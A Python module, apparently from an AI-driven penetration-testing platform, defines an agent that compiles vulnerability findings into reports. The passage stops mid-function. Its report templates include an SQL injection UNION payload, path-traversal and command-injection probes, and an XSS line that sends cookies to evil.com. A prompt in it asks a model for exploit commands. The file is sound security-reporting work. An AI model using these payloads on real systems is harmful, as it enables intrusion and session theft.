#!/usr/bin/env python3
"""
HexStrike Multi-Agent - 报告生成Agent（SmartAgent升级版）
支持：简报（网页展示）+ 详报（MD/TXT/PDF下载）
核心改进：深度提取漏洞数据 + 漏洞类型展示 + 多数据源整合
"""

import json
import os
import time
import copy
from typing import Dict, List, Optional
from datetime import datetime
from pathlib import Path

from .base_agent import BaseAgent, TaskResult, SmartAgent


class ReportAgent(BaseAgent):
    """报告生成Agent - 传统模式（兼容性保留）"""

    def get_system_prompt(self) -> str:
        return """你是一个专业的技术文档撰写专家，负责生成渗透测试报告。"""

    async def execute(self, target: str, options: Dict = None) -> TaskResult:
        options = options or {}
        result = TaskResult(agent_name=self.name, task_type="report", status="running",
                            metadata={"target": target, "options": options})
        try:
            all_results = await self._collect_results()
            report = self._generate_report(target, all_results)
            filename = f"pentest_report_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
            report_path = self.workspace / filename
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(report)
            result.result = {"report_file": str(report_path), "target": target}
            result.findings = [{"type": "report", "file": str(report_path), "size": len(report)}]
            result.status = "success"
        except Exception as e:
            result.status = "failed"
            result.add_error(str(e))
        return result

    async def _collect_results(self) -> Dict:
        all_results = {"info_gathering": [], "vuln_scan": [], "web_pentest": []}
        for json_file in self.workspace.glob("*.json"):
            try:
                with open(json_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    agent_name = data.get("agent_name", "")
                    findings = data.get("findings", [])
                    if "info" in agent_name.lower():
                        all_results["info_gathering"].extend(findings)
                    elif "vuln" in agent_name.lower():
                        all_results["vuln_scan"].extend(findings)
                    elif "web" in agent_name.lower():
                        all_results["web_pentest"].extend(findings)
            except Exception:
                pass
        return all_results

    def _generate_report(self, target: str, results: Dict) -> str:
        return f"# 渗透测试报告 - {target}\n\n生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"


class SmartReportAgent(SmartAgent):
    """智能报告生成Agent - 简报+详报+多格式导出"""

    display_name = "报告生成"

    ACTION_ALIASES = {
        "generate_report": "generate_report", "report": "generate_report",
        "report_generation": "generate_report",
        "collect_data": "collect_data", "data_collection": "collect_data",
        "classification": "classification", "classify": "classification",
        "correlation_analysis": "correlation_analysis", "correlate": "correlation_analysis",
        "generate_summary": "generate_summary", "summary": "generate_summary",
        "generate_detailed": "generate_detailed", "detailed": "generate_detailed",
    }

    def get_system_prompt(self) -> str:
        return """你是一个专业的渗透测试报告撰写专家。

你的职责：
1. 汇总所有渗透测试结果
2. 根据上下文信息进行漏洞关联分析
3. 按风险等级分类漏洞并给出动态评级
4. 对每个漏洞给出：发现方法、利用方式、修复建议
5. 识别攻击链：多个漏洞如何组合利用
6. 生成结构化报告

原则：
- 基于事实和数据，不夸大风险
- 修复建议要具体可操作，包含代码示例
- 关联分析不同漏洞的复合影响
- 每个漏洞都要说明：如何发现的、如何验证、如何利用、如何修复
- 按优先级排列修复建议"""

    def define_capabilities(self) -> Dict:
        return {
            "data_collection": {
                "sources": ["shared_memory", "workspace_files", "agent_results"],
                "format": "json"
            },
            "vulnerability_classification": {
                "methods": ["severity_based", "cvss_based", "ai_evaluation"],
                "categories": ["critical", "high", "medium", "low", "info"]
            },
            "correlation_analysis": {
                "methods": ["attack_chain", "common_root", "impact_multiplication"],
            },
            "report_generation": {
                "formats": ["markdown", "txt", "pdf"],
                "detail_levels": ["summary", "detailed"],
            }
        }

    def _analyze_situation(self, target: str, context: Dict) -> Dict:
        all_vulns = self._collect_all_vulnerabilities(context)
        services = context.get('services', {})
        technologies = context.get('technologies', [])
        findings = context.get('findings', [])

        vuln_by_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for vuln in all_vulns:
            if isinstance(vuln, dict):
                sev = vuln.get('severity', 'info').lower()
                if sev in vuln_by_severity:
                    vuln_by_severity[sev] += 1

        return {
            "target": target,
            "total_findings": len(findings),
            "total_vulnerabilities": len(all_vulns),
            "vulnerability_distribution": vuln_by_severity,
            "services_discovered": len(services),
            "technologies_identified": len(technologies),
            "previous_findings": findings[-20:],
        }

    # ═══════════════════════════════════════════════════════════
    # 核心：深度提取漏洞数据
    # ═══════════════════════════════════════════════════════════

    def _collect_all_vulnerabilities(self, context: Dict) -> List[Dict]:
        """从 context 的所有层级深度提取漏洞信息"""
        vulns = []

        # 1. 顶层 vulnerabilities 列表
        for v in context.get('vulnerabilities', []):
            if isinstance(v, dict):
                vulns.append(self._normalize_vuln(v))

        # 2. 从 findings 中提取漏洞类发现
        for f in context.get('findings', []):
            if isinstance(f, dict):
                ftype = str(f.get('type', '')).lower()
                if any(kw in ftype for kw in ['vuln', 'sqli', 'xss', 'inject', 'rce', 'lfi', 'rfi', 'upload', 'ssrf', 'csrf', 'xxe', 'deserial']):
                    vulns.append(self._normalize_vuln(f))

        # 3. 从执行结果中深度提取
        for entry in context.get('execution_history', []):
            if isinstance(entry, dict):
                result = entry.get('result', {})
                if isinstance(result, dict):
                    # 端口信息转化为服务发现
                    if result.get('ports'):
                        for p in result['ports']:
                            if isinstance(p, dict) and p.get('state') == 'open':
                                vulns.append(self._normalize_vuln({
                                    'type': 'open_port',
                                    'severity': 'info',
                                    'port': p.get('port', p.get('id', '')),
                                    'service': p.get('name', p.get('service', '')),
                                    'name': f"开放端口 {p.get('port', p.get('id', '?'))}/{p.get('name', p.get('service', '?'))}",
                                }))
                    # 漏洞列表
                    for v in result.get('vulnerabilities', []):
                        if isinstance(v, dict):
                            vulns.append(self._normalize_vuln(v))
                    # CVE列表
                    for cve in result.get('cves', []):
                        if isinstance(cve, dict):
                            vulns.append(self._normalize_vuln({
                                'type': 'cve',
                                'name': cve.get('id', cve.get('cve_id', 'CVE')),
                                'severity': cve.get('severity', 'medium'),
                                'description': cve.get('description', ''),
                            }))
                    # SQL注入
                    for sqli in result.get('sqli_found', []):
                        if isinstance(sqli, dict):
                            vulns.append(self._normalize_vuln({
                                'type': 'sql_injection', 'name': f"SQL注入 - {sqli.get('param', sqli.get('url', ''))}",
                                'severity': 'critical', 'url': sqli.get('url', ''),
                                'description': sqli.get('evidence', sqli.get('payload', '')),
                            }))
                    # XSS
                    for xss in result.get('xss_found', []):
                        if isinstance(xss, dict):
                            vulns.append(self._normalize_vuln({
                                'type': 'xss', 'name': f"XSS - {xss.get('param', xss.get('url', ''))}",
                                'severity': 'high', 'url': xss.get('url', ''),
                                'description': xss.get('evidence', xss.get('payload', '')),
                            }))
                    # 路径遍历
                    for pt in result.get('path_traversal_found', []):
                        if isinstance(pt, dict):
                            vulns.append(self._normalize_vuln({
                                'type': 'path_traversal', 'name': f"路径遍历 - {pt.get('param', '')}",
                                'severity': 'high', 'url': pt.get('url', ''),
                            }))
                    # 命令注入
                    for ci in result.get('command_injection_found', []):
                        if isinstance(ci, dict):
                            vulns.append(self._normalize_vuln({
                                'type': 'command_injection', 'name': f"命令注入 - {ci.get('param', '')}",
                                'severity': 'critical', 'url': ci.get('url', ''),
                            }))
                    # 敏感路径
                    for sp in result.get('sensitive_paths', []):
                        if isinstance(sp, dict):
                            vulns.append(self._normalize_vuln({
                                'type': 'sensitive_file', 'name': f"敏感文件 - {sp.get('path', sp.get('url', ''))}",
                                'severity': sp.get('severity', 'medium'), 'url': sp.get('url', ''),
                            }))
                    # 认证问题
                    auth = result.get('auth_issues', result.get('weak_auth', []))
                    if isinstance(auth, list):
                        for a in auth:
                            if isinstance(a, dict):
                                vulns.append(self._normalize_vuln({
                                    'type': 'weak_auth', 'name': f"弱认证 - {a.get('type', a.get('url', ''))}",
                                    'severity': 'high', 'url': a.get('url', ''),
                                }))
                    # SSL问题
                    for ssl in result.get('ssl_issues', []):
                        if isinstance(ssl, dict):
                            vulns.append(self._normalize_vuln({
                                'type': 'ssl_issue', 'name': f"SSL问题 - {ssl.get('issue', ssl.get('type', ''))}",
                                'severity': ssl.get('severity', 'medium'),
                            }))

        # 去重
        seen = set()
        unique = []
        for v in vulns:
            key = (v.get('type', ''), v.get('name', ''), v.get('url', ''), v.get('severity', ''))
            if key not in seen:
                seen.add(key)
                unique.append(v)

        return unique

    def _normalize_vuln(self, v: Dict) -> Dict:
        """标准化漏洞字典，确保所有必需字段存在"""
        vtype = v.get('type', v.get('vuln_type', v.get('name', '未知')).lower())
        name = v.get('name', v.get('title', v.get('type', '')))
        if not name or name == name.lower():
            # 生成友好的名称
            type_names = {
                'sqli': 'SQL注入', 'sql_injection': 'SQL注入',
                'xss': 'XSS跨站脚本', 'stored_xss': '存储型XSS', 'reflected_xss': '反射型XSS',
                'rce': '远程代码执行', 'command_injection': '命令注入',
                'lfi': '本地文件包含', 'rfi': '远程文件包含',
                'path_traversal': '路径遍历', 'directory_traversal': '目录遍历',
                'ssrf': '服务端请求伪造', 'csrf': '跨站请求伪造',
                'xxe': 'XML外部实体注入', 'upload': '文件上传漏洞',
                'deserialization': '反序列化漏洞', 'open_port': '开放端口',
                'sensitive_file': '敏感文件泄露', 'weak_auth': '弱认证',
                'ssl_issue': 'SSL/TLS问题', 'info_disclosure': '信息泄露',
                'cve': 'CVE漏洞', 'default_creds': '默认凭据',
            }
            name = type_names.get(vtype, vtype.replace('_', ' ').title())

        severity = v.get('severity', v.get('risk', 'info')).lower()
        # 智能推断严重程度
        if severity in ('info', 'low', 'medium', 'high', 'critical'):
            pass
        elif vtype in ('sqli', 'sql_injection', 'rce', 'command_injection'):
            severity = 'critical'
        elif vtype in ('xss', 'upload', 'lfi', 'ssrf', 'xxe', 'deserialization'):
            severity = 'high'
        elif vtype in ('csrf', 'path_traversal', 'rfi', 'weak_auth'):
            severity = 'medium'
        elif vtype in ('open_port', 'sensitive_file', 'info_disclosure', 'ssl_issue'):
            severity = 'low'
        else:
            severity = 'medium'

        return {
            'type': vtype,
            'name': name,
            'severity': severity,
            'url': v.get('url', v.get('path', '')),
            'description': v.get('description', v.get('evidence', v.get('detail', ''))),
            'port': v.get('port', v.get('id', '')),
            'service': v.get('service', v.get('name', '')),
            'cve_id': v.get('cve_id', v.get('id', '')),
            'payload': v.get('payload', v.get('parameter', '')),
            'fix_suggestion': v.get('fix_suggestion', ''),
        }

    def _extract_services(self, context: Dict) -> List[Dict]:
        """提取服务列表"""
        services = []
        svc_dict = context.get('services', {})
        if isinstance(svc_dict, dict):
            for port, info in svc_dict.items():
                if isinstance(info, dict):
                    services.append({
                        'port': port,
                        'service': info.get('service', info.get('name', 'unknown')),
                        'state': info.get('state', 'open'),
                    })
        # 也从 findings 中提取端口信息
        for f in context.get('findings', []):
            if isinstance(f, dict) and f.get('type') in ('port', 'open_port', 'service'):
                services.append({
                    'port': f.get('port', f.get('id', '')),
                    'service': f.get('service', f.get('name', '')),
                    'state': 'open',
                })
        return services

    # ═══════════════════════════════════════════════════════════
    # 动作执行
    # ═══════════════════════════════════════════════════════════

    async def _execute_plan(self, plan: Dict, target: str) -> List:
        results = []
        for step in plan.get('steps', []):
            action = step['action']
            params = step.get('params', {})
            self._emit_thinking("action",
                "⚡ 执行: {} | 参数: {} | 原因: {}".format(
                    action, json.dumps(params, ensure_ascii=False) if params else '默认',
                    step.get('reason', '编排器指定')))
            if hasattr(self, f'_do_{action}'):
                method = getattr(self, f'_do_{action}')
                try:
                    import asyncio as _asyncio
                    import inspect as _inspect
                    if _inspect.iscoroutinefunction(method) or _asyncio.iscoroutinefunction(method):
                        result = await method(target, params)
                    else:
                        result = method(target, params)
                        if _inspect.iscoroutine(result):
                            result = await result
                    if not isinstance(result, dict):
                        result = {'success': True, 'raw': str(result)[:500]}
                    results.append({'action': action, 'result': result,
                                    'success': result.get('success', False)})
                except Exception as e:
                    self.logger.error(f"[Report] 执行 {action} 失败: {e}")
                    results.append({'action': action, 'result': {'success': False, 'error': str(e)}, 'success': False})
            else:
                try:
                    result = await self._do_generate_report(target, params)
                    if not isinstance(result, dict):
                        result = {'success': True, 'raw': str(result)[:500]}
                    results.append({'action': action, 'result': result, 'success': True})
                except Exception as e:
                    results.append({'action': action, 'result': {'success': False, 'error': str(e)}, 'success': False})
        return results

    # ──────────────── 动作实现 ────────────────

    async def _do_collect_data(self, target: str, params: Dict) -> Dict:
        context = self.context
        all_vulns = self._collect_all_vulnerabilities(context)
        services = self._extract_services(context)
        technologies = context.get('technologies', [])
        return {'success': True, 'context_data': {
            'vulnerabilities': all_vulns,
            'services': services,
            'technologies': technologies,
            'findings': context.get('findings', []),
        }}

    async def _do_classification(self, target: str, params: Dict) -> Dict:
        all_vulns = self._collect_all_vulnerabilities(self.context)
        classified = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for vuln in all_vulns:
            sev = vuln.get('severity', 'info').lower()
            if sev in classified:
                classified[sev].append(vuln)
            else:
                classified['info'].append(vuln)
        return {'success': True, 'classified': classified,
                'statistics': {k: len(v) for k, v in classified.items()}}

    async def _do_correlation_analysis(self, target: str, params: Dict) -> Dict:
        all_vulns = self._collect_all_vulnerabilities(self.context)
        from .knowledge_graph import PentestKnowledgeGraph
        kg = PentestKnowledgeGraph()
        recommendation = kg.classify_and_recommend(all_vulns)
        return {'success': True, 'correlation': recommendation,
                'attack_chains': self._identify_attack_chains(all_vulns)}

    def _identify_attack_chains(self, vulnerabilities: List) -> List[Dict]:
        chains = []
        has_sqli = any('sql' in str(v.get('type', '')).lower() for v in vulnerabilities if isinstance(v, dict))
        has_db_port = any('3306' in str(v.get('port', '')) or 'mysql' in str(v.get('service', '')).lower()
                          for v in vulnerabilities if isinstance(v, dict))
        if has_sqli and has_db_port:
            chains.append({'name': 'SQL注入→数据库直接访问', 'severity': 'critical',
                'description': 'SQL注入配合开放数据库端口，可能实现完整数据库控制',
                'steps': ['利用SQL注入获取数据库信息', '利用数据库端口直接连接', '提取全部数据']})
        has_upload = any('upload' in str(v.get('type', '')).lower() for v in vulnerabilities if isinstance(v, dict))
        if has_upload:
            chains.append({'name': '文件上传→远程代码执行', 'severity': 'critical',
                'description': '文件上传漏洞可上传WebShell获取服务器控制权',
                'steps': ['绕过上传限制', '上传WebShell', '获取服务器控制']})
        has_xss = any('xss' in str(v.get('type', '')).lower() for v in vulnerabilities if isinstance(v, dict))
        has_csrf = any('csrf' in str(v.get('type', '')).lower() for v in vulnerabilities if isinstance(v, dict))
        if has_xss and has_csrf:
            chains.append({'name': 'XSS+CSRF→账户接管', 'severity': 'high',
                'description': 'XSS窃取Cookie配合CSRF可实现账户接管',
                'steps': ['注入XSS窃取管理员Cookie', '利用CSRF修改管理员密码', '接管管理员账户']})
        return chains

    # ═══════════════════════════════════════════════════════════
    # 简报生成 — 网页端直接展示
    # ═══════════════════════════════════════════════════════════

    async def _do_generate_summary(self, target: str, params: Dict) -> Dict:
        """生成简报 — 网页端直接展示，含漏洞类型"""
        context = self.context or {}
        all_vulns = self._collect_all_vulnerabilities(context)
        services = self._extract_services(context)
        findings = context.get('findings', [])
        technologies = context.get('technologies', [])

        # 按严重程度分类
        vuln_by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for vuln in all_vulns:
            sev = vuln.get('severity', 'info').lower()
            if sev in vuln_by_severity:
                vuln_by_severity[sev].append(vuln)
            else:
                vuln_by_severity['info'].append(vuln)

        # 排除开放端口（info级别），只统计真正的漏洞
        real_vulns = []
        for sev in ['critical', 'high', 'medium', 'low']:
            real_vulns.extend(vuln_by_severity[sev])
        total_real = len(real_vulns)

        # 风险评级（基于真正漏洞数量）
        if len(vuln_by_severity['critical']) > 0:
            risk = "🔴 极高风险"
        elif len(vuln_by_severity['high']) > 2:
            risk = "🟠 高风险"
        elif len(vuln_by_severity['high']) > 0:
            risk = "🟡 中等风险"
        elif total_real > 0:
            risk = "🔵 低风险"
        else:
            risk = "✅ 安全"

        # Top 漏洞列表（排除开放端口，按严重程度取Top10）
        top_vulns = []
        for sev in ['critical', 'high', 'medium', 'low']:
            for v in vuln_by_severity[sev][:10]:
                if len(top_vulns) >= 10:
                    break
                top_vulns.append({
                    'name': v.get('name', v.get('type', '未知')),
                    'type': v.get('type', ''),
                    'severity': sev,
                    'url': v.get('url', ''),
                    'description': (v.get('description', '') or '')[:150],
                    'port': v.get('port', ''),
                })
            if len(top_vulns) >= 10:
                break

        summary = {
            'target': target,
            'risk_level': risk,
            'total_vulnerabilities': total_real,
            'total_findings': len(findings),
            'total_services': len(services),
            'vuln_stats': {
                'critical': len(vuln_by_severity['critical']),
                'high': len(vuln_by_severity['high']),
                'medium': len(vuln_by_severity['medium']),
                'low': len(vuln_by_severity['low']),
                'info': len(vuln_by_severity['info']),
            },
            'top_vulns': top_vulns,
            'technologies': [t.get('name', str(t)) if isinstance(t, dict) else str(t) for t in technologies[:10]],
        }
        return {'success': True, 'summary': summary, 'type': 'summary'}

    # ═══════════════════════════════════════════════════════════
    # 详细报告生成 — 含漏洞发现方法、利用方式、修复建议
    # ═══════════════════════════════════════════════════════════

    async def _do_generate_detailed(self, target: str, params: Dict) -> Dict:
        """生成详细报告"""
        context = self.context or {}
        all_vulns = self._collect_all_vulnerabilities(context)
        services = self._extract_services(context)
        findings = context.get('findings', [])
        technologies = context.get('technologies', [])
        execution_history = context.get('execution_history', [])

        vuln_by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for vuln in all_vulns:
            sev = vuln.get('severity', 'info').lower()
            if sev in vuln_by_severity:
                vuln_by_severity[sev].append(vuln)
            else:
                vuln_by_severity['info'].append(vuln)

        # AI增强：让AI对每个漏洞补充发现方法和利用方式
        enhanced_vulns = {}
        if self.ai_session:
            try:
                self._emit_thinking("analyze", "🔍 AI 正在深度分析漏洞发现方法和利用路径...")
                # 只发送真正的漏洞（排除info级别）
                real_vulns = []
                for sev in ['critical', 'high', 'medium', 'low']:
                    real_vulns.extend(vuln_by_severity[sev])
                if real_vulns:
                    vuln_summary = json.dumps(real_vulns[:20], ensure_ascii=False, indent=2)[:6000]
                    prompt = f"""请对以下漏洞进行分析，为每个漏洞补充：
1. 发现方法（如何被检测到的）
2. 验证步骤（如何确认漏洞存在）
3. 利用方式（攻击者如何利用）
4. 利用命令/代码示例
5. 修复建议（具体代码/配置修改）
6. 修复优先级（紧急/高/中/低）

漏洞列表：
{vuln_summary}

返回JSON格式:
{{
  "vulnerabilities": [
    {{
      "name": "漏洞名称",
      "severity": "critical/high/medium/low",
      "discovery_method": "如何发现的",
      "verification_steps": ["步骤1", "步骤2"],
      "exploitation": "利用方式描述",
      "exploit_example": "具体命令或代码",
      "fix_suggestion": "修复建议",
      "fix_example": "修复代码/配置示例",
      "fix_priority": "紧急/高/中/低"
    }}
  ],
  "attack_chains": [
    {{
      "name": "攻击链名称",
      "severity": "critical",
      "steps": ["步骤1", "步骤2", "步骤3"],
      "description": "描述"
    }}
  ]
}}"""
                    response = self._ai_chat_with_timeout(prompt, timeout=60)
                    from .utils import parse_json_response
                    parsed = parse_json_response(response)
                    if parsed and 'vulnerabilities' in parsed:
                        enhanced_vulns = parsed
            except Exception as e:
                self.logger.warning(f"AI漏洞增强分析失败: {e}")

        # 生成Markdown详细报告
        report_md = self._build_detailed_report_md(
            target, findings, vuln_by_severity, services, technologies,
            execution_history, enhanced_vulns
        )

        # 保存报告文件
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        workspace = Path(self.workspace) if self.workspace else Path('.')
        report_dir = workspace / "reports"
        report_dir.mkdir(parents=True, exist_ok=True)

        # 计算 workspace 的绝对路径，用于生成相对路径
        workspace_abs = workspace.resolve()

        files = {}
        # MD 格式
        md_path = report_dir / f"pentest_detail_{timestamp}.md"
        md_path.write_text(report_md, encoding='utf-8')
        files['md'] = str(md_path.resolve().relative_to(workspace_abs))

        # TXT 格式
        txt_content = self._md_to_txt(report_md)
        txt_path = report_dir / f"pentest_detail_{timestamp}.txt"
        txt_path.write_text(txt_content, encoding='utf-8')
        files['txt'] = str(txt_path.resolve().relative_to(workspace_abs))

        # PDF 格式（尝试使用weasyprint）
        try:
            pdf_path = report_dir / f"pentest_detail_{timestamp}.pdf"
            html_content = self._md_to_html(report_md)
            try:
                from weasyprint import HTML
                HTML(string=html_content).write_pdf(str(pdf_path))
                files['pdf'] = str(pdf_path.resolve().relative_to(workspace_abs))
            except ImportError:
                html_path = report_dir / f"pentest_detail_{timestamp}.html"
                html_path.write_text(html_content, encoding='utf-8')
                files['html'] = str(html_path.resolve().relative_to(workspace_abs))
                files['pdf'] = None
        except Exception as e:
            self.logger.warning(f"PDF生成失败: {e}")
            files['pdf'] = None

        real_total = sum(len(vuln_by_severity[s]) for s in ['critical', 'high', 'medium', 'low'])
        return {
            'success': True,
            'type': 'detailed',
            'files': files,
            'report_size': len(report_md),
            'vulnerability_summary': {k: len(v) for k, v in vuln_by_severity.items()},
            'total_vulnerabilities': real_total,
            'enhanced': bool(enhanced_vulns),
        }

    async def _do_generate_report(self, target: str, params: Dict) -> Dict:
        """默认：同时生成简报和详报"""
        summary_result = await self._do_generate_summary(target, params)
        detailed_result = await self._do_generate_detailed(target, params)
        return {
            'success': True,
            'type': 'full',
            'summary': summary_result.get('summary', {}),
            'files': detailed_result.get('files', {}),
            'vulnerability_summary': detailed_result.get('vulnerability_summary', {}),
        }

    # ──────────────── 报告内容构建 ────────────────

    def _build_detailed_report_md(self, target, findings, vuln_by_severity,
                                   services, technologies, execution_history,
                                   enhanced_vulns) -> str:
        real_total = sum(len(vuln_by_severity[s]) for s in ['critical', 'high', 'medium', 'low'])
        info_total = len(vuln_by_severity.get('info', []))
        total_all = real_total + info_total
        now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # 风险评级
        if len(vuln_by_severity['critical']) > 0:
            risk = "🔴 极高风险 — 存在严重漏洞，需立即修复"
        elif len(vuln_by_severity['high']) > 2:
            risk = "🟠 高风险 — 存在多个高危漏洞"
        elif len(vuln_by_severity['high']) > 0:
            risk = "🟡 中等风险 — 存在少量高危漏洞"
        elif real_total > 0:
            risk = "🔵 低风险 — 安全问题较少"
        else:
            risk = "✅ 安全 — 未发现明显安全漏洞"

        report = f"""# 🔒 HexStrike 智能渗透测试详细报告

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **测试目标** | {target} |
| **测试时间** | {now_str} |
| **报告类型** | AI驱动详细报告 |
| **发现总数** | {len(findings)} |
| **漏洞总数** | {real_total} |
| **服务/端口** | {info_total} |
| **整体风险** | {risk} |

---

## 📊 漏洞统计

| 严重程度 | 数量 | 占比 |
|----------|------|------|
| 🔴 严重 (Critical) | {len(vuln_by_severity['critical'])} | {len(vuln_by_severity['critical'])/max(real_total,1)*100:.1f}% |
| 🟠 高危 (High) | {len(vuln_by_severity['high'])} | {len(vuln_by_severity['high'])/max(real_total,1)*100:.1f}% |
| 🟡 中危 (Medium) | {len(vuln_by_severity['medium'])} | {len(vuln_by_severity['medium'])/max(real_total,1)*100:.1f}% |
| 🔵 低危 (Low) | {len(vuln_by_severity['low'])} | {len(vuln_by_severity['low'])/max(real_total,1)*100:.1f}% |
| ℹ️ 信息 (Info) | {info_total} | — |

---

## 🖥 发现的服务

"""
        if services:
            report += "| 端口 | 服务 | 状态 |\n|------|------|------|\n"
            for svc in services:
                report += f"| {svc.get('port', '')} | {svc.get('service', 'unknown')} | {svc.get('state', 'open')} |\n"
        else:
            report += "*未发现开放服务*\n"

        report += "\n## 💻 识别的技术栈\n\n"
        if technologies:
            for tech in technologies[:15]:
                if isinstance(tech, dict):
                    report += f"- {tech.get('name', str(tech))}\n"
                else:
                    report += f"- {tech}\n"
        else:
            report += "*未识别到技术栈*\n"

        # ── 漏洞详情 ──
        report += "\n---\n\n## 🐛 漏洞详情\n\n"
        enhanced_list = enhanced_vulns.get('vulnerabilities', []) if enhanced_vulns else []
        enhanced_map = {v.get('name', ''): v for v in enhanced_list if isinstance(v, dict)}

        for severity in ['critical', 'high', 'medium', 'low', 'info']:
            vulns = vuln_by_severity.get(severity, [])
            if not vulns:
                continue
            emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🔵', 'info': 'ℹ️'}[severity]
            report += f"### {emoji} {severity.upper()} 级别漏洞 ({len(vulns)})\n\n"

            for i, vuln in enumerate(vulns[:20], 1):
                name = vuln.get('name', vuln.get('type', '未知漏洞'))
                vtype = vuln.get('type', '')
                desc = vuln.get('description', '')
                url = vuln.get('url', '')
                cve = vuln.get('cve_id', '')

                report += f"#### {i}. {name}\n\n"

                if vtype:
                    report += f"**类型**: `{vtype}`\n\n"
                if desc:
                    report += f"**描述**: {desc}\n\n"
                if url:
                    report += f"**URL**: `{url}`\n\n"
                if cve:
                    report += f"**CVE**: {cve}\n\n"

                # AI增强的详细分析
                enhanced = enhanced_map.get(name, {})
                if enhanced:
                    if enhanced.get('discovery_method'):
                        report += f"**🔍 发现方法**: {enhanced['discovery_method']}\n\n"
                    if enhanced.get('verification_steps'):
                        report += "**✅ 验证步骤**:\n\n"
                        for step in enhanced['verification_steps']:
                            report += f"  {step}\n"
                        report += "\n"
                    if enhanced.get('exploitation'):
                        report += f"**⚔️ 利用方式**: {enhanced['exploitation']}\n\n"
                    if enhanced.get('exploit_example'):
                        report += f"**利用示例**:\n```\n{enhanced['exploit_example']}\n```\n\n"
                    if enhanced.get('fix_suggestion'):
                        report += f"**🛡 修复建议**: {enhanced['fix_suggestion']}\n\n"
                    if enhanced.get('fix_example'):
                        report += f"**修复示例**:\n```\n{enhanced['fix_example']}\n```\n\n"
                    if enhanced.get('fix_priority'):
                        report += f"**修复优先级**: {enhanced['fix_priority']}\n\n"
                else:
                    report += self._generic_vuln_detail(vuln, severity)

        # ── 攻击链 ──
        all_vulns_flat = []
        for sev in ['critical', 'high', 'medium']:
            all_vulns_flat.extend(vuln_by_severity.get(sev, []))
        chains = self._identify_attack_chains(all_vulns_flat)
        ai_chains = enhanced_vulns.get('attack_chains', []) if enhanced_vulns else []
        all_chains = chains + [c for c in ai_chains if c not in chains]

        if all_chains:
            report += "---\n\n## ⛓ 攻击链分析\n\n"
            for chain in all_chains:
                if isinstance(chain, dict):
                    report += f"### {chain.get('name', '未知攻击链')} [{chain.get('severity', 'high')}]\n\n"
                    report += f"{chain.get('description', '')}\n\n"
                    if chain.get('steps'):
                        report += "**攻击步骤**:\n\n"
                        for j, step in enumerate(chain['steps'], 1):
                            report += f"  {j}. {step}\n"
                        report += "\n"

        # ── 修复建议时间表 ──
        report += """---

## 📝 修复建议时间表

### 🔴 紧急修复 (0-24小时)
1. 修复所有 Critical 级别漏洞
2. 关闭不必要的端口和服务
3. 更新存在已知CVE的组件
4. 限制管理后台访问来源
5. 临时部署WAF规则拦截攻击

### 🟠 高优先级 (1-7天)
1. 修复所有 High 级别漏洞
2. 加强输入验证和参数化查询
3. 配置CSP等安全响应头
4. 启用HTTPS并禁用弱TLS版本
5. 实施访问控制和身份验证

### 🟡 中优先级 (1-4周)
1. 修复 Medium 级别漏洞
2. 加强日志监控和告警
3. 实施安全编码规范
4. 进行安全意识培训
5. 建立漏洞管理流程

---

*报告由 HexStrike AI 智能渗透测试平台自动生成*
*生成时间: """ + now_str + "*\n"

        return report

    def _generic_vuln_detail(self, vuln: Dict, severity: str) -> str:
        """无AI增强时的通用漏洞分析"""
        vuln_type = vuln.get('type', '').lower()
        url = vuln.get('url', '')
        details = ""

        if 'sql' in vuln_type or 'sqli' in vuln_type:
            details = """**🔍 发现方法**: 通过向参数注入SQL语句（' OR 1=1 --等）观察响应变化

**⚔️ 利用方式**: 通过构造恶意SQL语句获取数据库数据

**利用示例**:
```sql
' UNION SELECT username, password FROM users --
```

**🛡 修复建议**: 使用参数化查询，禁止拼接SQL语句

**修复示例**:
```python
# 错误: cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
# 正确:
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**修复优先级**: 紧急
"""
        elif 'xss' in vuln_type:
            details = """**🔍 发现方法**: 在输入框注入 `<script>alert(1)</script>` 观察是否执行

**⚔️ 利用方式**: 注入恶意JavaScript窃取用户Cookie/会话

**利用示例**:
```html
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

**🛡 修复建议**: 对所有用户输入进行HTML编码，配置CSP响应头

**修复优先级**: 高
"""
        elif 'upload' in vuln_type:
            details = """**🔍 发现方法**: 尝试上传 `.php`/`.jsp` 等可执行文件

**⚔️ 利用方式**: 上传WebShell获取服务器控制权

**🛡 修复建议**: 白名单校验文件类型，重命名文件，存储到非Web目录

**修复优先级**: 紧急
"""
        elif 'path_traversal' in vuln_type or 'traversal' in vuln_type:
            details = """**🔍 发现方法**: 在路径参数中注入 `../../etc/passwd` 观察响应

**⚔️ 利用方式**: 读取服务器任意文件，获取配置信息和密钥

**🛡 修复建议**: 规范化路径，禁止路径中包含 `..`，使用白名单

**修复优先级**: 高
"""
        elif 'command' in vuln_type or 'rce' in vuln_type:
            details = """**🔍 发现方法**: 在参数中注入 `; id` 或 `| whoami` 观察响应

**⚔️ 利用方式**: 执行任意系统命令，完全控制服务器

**🛡 修复建议**: 禁止用户输入传入命令行，使用安全API替代shell调用

**修复优先级**: 紧急
"""
        elif severity in ('critical', 'high'):
            details = f"""**🔍 发现方法**: 自动化扫描工具检测

**🛡 修复建议**: 根据漏洞类型进行针对性修复，限制访问来源

**修复优先级**: {'紧急' if severity == 'critical' else '高'}
"""
        else:
            details = """**🛡 修复建议**: 评估风险后按优先级修复

**修复优先级**: 中
"""
        return details

    # ──────────────── 格式转换 ────────────────

    def _md_to_txt(self, md: str) -> str:
        """Markdown → 纯文本"""
        import re
        txt = md
        txt = re.sub(r'^#{1,6}\s+', '', txt, flags=re.MULTILINE)
        txt = re.sub(r'\*\*(.+?)\*\*', r'\1', txt)
        txt = re.sub(r'`(.+?)`', r'\1', txt)
